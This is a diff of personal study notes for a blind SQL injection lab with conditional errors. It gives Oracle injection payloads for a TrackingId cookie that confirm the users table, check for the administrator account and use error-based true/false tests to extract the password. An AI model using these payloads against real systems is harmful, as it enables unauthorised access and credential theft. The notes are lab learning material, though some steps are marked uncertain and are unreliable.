@@ -39,13 +39,13 @@ Step6: See this --> Source: Ms.Khalil  https://www.youtube.com/watch?v=_7w-KEP_K
     Lab: Blind SQL injection with conditional errors
 
     Detecton:
-    |    Step1: what's target?
+    |Step1: what's target?
     |        # Output the administrator password
     |        # Login as the administratoruser
     |    
     |Step2: Open BurpSuite Pro 
     |
-    |Step3: Go ro Proxy Tap
+    |Step3: Go to Proxy Tap
     |
     |Step4: Intercept Go to On
     |
@@ -55,9 +55,9 @@ Step6: See this --> Source: Ms.Khalil  https://www.youtube.com/watch?v=_7w-KEP_K
     |
     |Step8: Go to HTTPHistory
 
-        Step9: Send to Repeater, First Packet 
+    Step9: Send to Repeater, First Packet 
 
-    Key: True is just 200 status code and False is 500 status code without any others!!!
+    Key: "True" is just 200 status code and "False" is 500 status code without any others!!!
 
     Target1: Prove the parameter is vulnerable:
     |
@@ -68,6 +68,7 @@ Step6: See this --> Source: Ms.Khalil  https://www.youtube.com/watch?v=_7w-KEP_K
     |
     |Step2: in End of TrackingId: --> ''
     |   Result: If get 200 number status code, maybe is vulnerable
+    |       TrackingId='asd'''
     |
     |Step3: ' || (select '') || '  
     |    
@@ -80,7 +81,7 @@ Step6: See this --> Source: Ms.Khalil  https://www.youtube.com/watch?v=_7w-KEP_K
     |   Result1: If is 200 status code is probably vulnerable
     |   Result2: database os Oracle
     |
-    |Step7: ' || (select '' from tabledoesnotexist123123) || '  
+    |Step7: ' || (select '' from table_does_not_exist123123) || '  
     |   Result: If was error is most probably SQLi 
     |       
     
@@ -97,13 +98,16 @@ Step6: See this --> Source: Ms.Khalil  https://www.youtube.com/watch?v=_7w-KEP_K
     |
     |   Is 200 so "users" table exist
 
+
+
     Target3: Confirm that the administrator user exists in the users database
     |   
     |Step1: ' || (select '' from users where username='administrator') || '  
     |   Result: is 200 status 
+    |   So administrator exists
     |   
-    |Step2: ' || (select '' from users where username='Testadministrator') || '  
-    |   Result: is 500 status 
+    |Step2: ' || (select '' from users where username='SA#132ASd') || '  
+    |   Result: is 500 status  ??????
     |   
     mini-Target is diagnosis True/False response:   
     |
@@ -117,10 +121,10 @@ Step6: See this --> Source: Ms.Khalil  https://www.youtube.com/watch?v=_7w-KEP_K
     |   Result: Get 500 status code 
     |   So => is "False"
     |   
-    |Step5: ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
-    |   Result: Get 500 status code 
+    |Step5: ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+    |   Result: Get 200 status code 
     |   So => administrator is exists
-    |Step6 test: ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='xxxadministrator') || '
+    |Step6 test: ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='xxxadministrator') || '
     |   
     
     
@@ -137,7 +141,7 @@ Step6: See this --> Source: Ms.Khalil  https://www.youtube.com/watch?v=_7w-KEP_K
     |   
     |Step3: get step3 into "Intruder" 
     |   Result: Compare number statuses, ???
-    |   So =>
+    |   So => 20 
 
     Target5: Output the administrator password
     |
@@ -152,7 +156,9 @@ Step6: See this --> Source: Ms.Khalil  https://www.youtube.com/watch?v=_7w-KEP_K
 
     Log in to website vulnerable and finish it :)
 
-
+        Pass:
+        1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+        X X X X X X X X X X  X  X  X  X  X  X  X  X  X  X
 
 Solution:
 
